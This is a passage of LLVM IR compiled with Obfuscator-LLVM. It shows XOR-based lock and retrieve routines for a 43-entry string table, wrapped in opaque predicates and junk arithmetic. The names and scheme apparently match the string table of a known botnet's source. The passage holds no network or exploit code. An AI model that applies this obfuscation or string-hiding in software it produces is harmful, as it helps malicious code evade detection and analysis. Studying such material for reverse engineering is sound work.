  %68 = zext i8 %67 to i32
  %69 = load %struct.table_value*, %struct.table_value** %4, align 8
  %70 = getelementptr inbounds %struct.table_value, %struct.table_value* %69, i32 0, i32 0
  %71 = load i8*, i8** %70, align 8
  %72 = load i32, i32* %3, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = xor i32 %76, %68
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %74, align 1
  %79 = load i8, i8* %8, align 1
  %80 = zext i8 %79 to i32
  %81 = load %struct.table_value*, %struct.table_value** %4, align 8
  %82 = getelementptr inbounds %struct.table_value, %struct.table_value* %81, i32 0, i32 0
  %83 = load i8*, i8** %82, align 8
  %84 = load i32, i32* %3, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8, i8* %83, i64 %85
  %87 = load i8, i8* %86, align 1
  %88 = sext i8 %87 to i32
  %89 = xor i32 %88, %80
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %86, align 1
  %91 = load i32, i32* @x.47
  %92 = load i32, i32* @y.48
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %99

; <label>:99:                                     ; preds = %originalBBpart2
  %100 = load i32, i32* %3, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %3, align 4
  br label %27

; <label>:102:                                    ; preds = %27
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %34
  %103 = load i8, i8* %5, align 1
  %104 = zext i8 %103 to i32
  %105 = load %struct.table_value*, %struct.table_value** %4, align 8
  %106 = getelementptr inbounds %struct.table_value, %struct.table_value* %105, i32 0, i32 0
  %107 = load i8*, i8** %106, align 8
  %108 = load i32, i32* %3, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i8, i8* %110, align 1
  %112 = sext i8 %111 to i32
  %_ = shl i32 %112, %104
  %_1 = shl i32 %112, %104
  %_2 = sub i32 %112, %104
  %gen = mul i32 %_2, %104
  %_3 = shl i32 %112, %104
  %_4 = sub i32 %112, %104
  %gen5 = mul i32 %_4, %104
  %_6 = sub i32 0, %112
  %gen7 = add i32 %_6, %104
  %_8 = sub i32 %112, %104
  %gen9 = mul i32 %_8, %104
  %113 = xor i32 %112, %104
  %114 = trunc i32 %113 to i8
  store i8 %114, i8* %110, align 1
  %115 = load i8, i8* %6, align 1
  %116 = zext i8 %115 to i32
  %117 = load %struct.table_value*, %struct.table_value** %4, align 8
  %118 = getelementptr inbounds %struct.table_value, %struct.table_value* %117, i32 0, i32 0
  %119 = load i8*, i8** %118, align 8
  %120 = load i32, i32* %3, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %119, i64 %121
  %123 = load i8, i8* %122, align 1
  %124 = sext i8 %123 to i32
  %_10 = sub i32 0, %124
  %gen11 = add i32 %_10, %116
  %_12 = sub i32 0, %124
  %gen13 = add i32 %_12, %116
  %_14 = sub i32 0, %124
  %gen15 = add i32 %_14, %116
  %125 = xor i32 %124, %116
  %126 = trunc i32 %125 to i8
  store i8 %126, i8* %122, align 1
  %127 = load i8, i8* %7, align 1
  %128 = zext i8 %127 to i32
  %129 = load %struct.table_value*, %struct.table_value** %4, align 8
  %130 = getelementptr inbounds %struct.table_value, %struct.table_value* %129, i32 0, i32 0
  %131 = load i8*, i8** %130, align 8
  %132 = load i32, i32* %3, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8, i8* %131, i64 %133
  %135 = load i8, i8* %134, align 1
  %136 = sext i8 %135 to i32
  %_16 = sub i32 0, %136
  %gen17 = add i32 %_16, %128
  %_18 = shl i32 %136, %128
  %_19 = sub i32 %136, %128
  %gen20 = mul i32 %_19, %128
  %_21 = shl i32 %136, %128
  %_22 = sub i32 0, %136
  %gen23 = add i32 %_22, %128
  %_24 = sub i32 0, %136
  %gen25 = add i32 %_24, %128
  %137 = xor i32 %136, %128
  %138 = trunc i32 %137 to i8
  store i8 %138, i8* %134, align 1
  %139 = load i8, i8* %8, align 1
  %140 = zext i8 %139 to i32
  %141 = load %struct.table_value*, %struct.table_value** %4, align 8
  %142 = getelementptr inbounds %struct.table_value, %struct.table_value* %141, i32 0, i32 0
  %143 = load i8*, i8** %142, align 8
  %144 = load i32, i32* %3, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8, i8* %143, i64 %145
  %147 = load i8, i8* %146, align 1
  %148 = sext i8 %147 to i32
  %_26 = sub i32 0, %148
  %gen27 = add i32 %_26, %140
  %_28 = sub i32 0, %148
  %gen29 = add i32 %_28, %140
  %_30 = sub i32 %148, %140
  %gen31 = mul i32 %_30, %140
  %_32 = shl i32 %148, %140
  %_33 = shl i32 %148, %140
  %149 = xor i32 %148, %140
  %150 = trunc i32 %149 to i8
  store i8 %150, i8* %146, align 1
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = load i32, i32* @x.49
  %3 = load i32, i32* @y.50
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8, align 1
  %11 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %10, align 1
  %12 = load i8, i8* %10, align 1
  %13 = zext i8 %12 to i64
  %14 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %13
  store %struct.table_value* %14, %struct.table_value** %11, align 8
  %15 = load i8, i8* %10, align 1
  call void @toggle_obf(i8 zeroext %15)
  %16 = load i32, i32* @x.49
  %17 = load i32, i32* @y.50
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %24 = alloca i8, align 1
  %25 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %24, align 1
  %26 = load i8, i8* %24, align 1
  %27 = zext i8 %26 to i64
  %28 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %27
  store %struct.table_value* %28, %struct.table_value** %25, align 8
  %29 = load i8, i8* %24, align 1
  call void @toggle_obf(i8 zeroext %29)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load i32, i32* @x.51
  %19 = load i32, i32* @y.52
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load %struct.table_value*, %struct.table_value** %5, align 8
  %27 = getelementptr inbounds %struct.table_value, %struct.table_value* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  %29 = load i32, i32* @x.51
  %30 = load i32, i32* @y.52
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8* %28

originalBBalteredBB:                              ; preds = %originalBB, %17
  %37 = load %struct.table_value*, %struct.table_value** %5, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  br label %originalBB
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
